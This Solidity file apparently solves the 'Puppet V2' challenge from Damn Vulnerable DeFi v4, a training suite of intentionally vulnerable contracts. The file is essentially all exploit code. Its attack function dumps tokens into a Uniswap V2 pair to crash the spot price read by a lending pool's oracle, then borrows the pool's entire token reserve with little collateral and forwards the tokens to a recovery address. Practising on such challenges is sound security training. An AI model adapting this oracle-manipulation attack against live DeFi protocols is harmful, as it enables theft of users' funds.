// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {IUniswapV2Factory} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import {IUniswapV2Router02} from "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {PuppetV2Pool} from "../../src/puppet-v2/PuppetV2Pool.sol";

contract PuppetV2Exploit {
    address recovery;
    
    uint256 constant UNISWAP_INITIAL_TOKEN_RESERVE = 100e18;
    uint256 constant UNISWAP_INITIAL_WETH_RESERVE = 10e18;
    uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 10_000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 20e18;
    uint256 constant POOL_INITIAL_TOKEN_BALANCE = 1_000_000e18;

    WETH weth;
    DamnValuableToken token;
    IUniswapV2Router02 uniswapV2Router;
    IUniswapV2Pair uniswapV2Exchange;
    PuppetV2Pool lendingPool;

    constructor(WETH _weth, 
                DamnValuableToken _token, 
                IUniswapV2Pair _exchange,
                IUniswapV2Router02 _router,
                PuppetV2Pool _pool,
                address _recovery)
    {
        weth = _weth;
        token = _token;
        uniswapV2Exchange = _exchange;
        uniswapV2Router = _router;
        lendingPool = _pool;
        recovery = _recovery;
    }

    function attack() external payable {
        console.log("token in uniswap before: ", weth.balanceOf(address(uniswapV2Exchange)));
        console.log("token in uniswap before: ", token.balanceOf(address(uniswapV2Exchange)));
        
        address[] memory path = new address[](2);
        path[0] = address(token);
        path[1] = address(weth);
        token.approve(address(uniswapV2Router), PLAYER_INITIAL_TOKEN_BALANCE);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            PLAYER_INITIAL_TOKEN_BALANCE,
            1 ether,
            path,
            address(this),
            block.timestamp
        );
        
        console.log("token in uniswap after: ", weth.balanceOf(address(uniswapV2Exchange)));
        console.log("token in uniswap after: ", token.balanceOf(address(uniswapV2Exchange)));
        console.log("need: ", lendingPool.calculateDepositOfWETHRequired(
            POOL_INITIAL_TOKEN_BALANCE
        ));
        
        weth.deposit{value: address(this).balance}();
        weth.approve(address(lendingPool), weth.balanceOf(address(this)));

        lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE);
        token.transfer(recovery, token.balanceOf(address(this)));
    }

    receive() external payable {}
}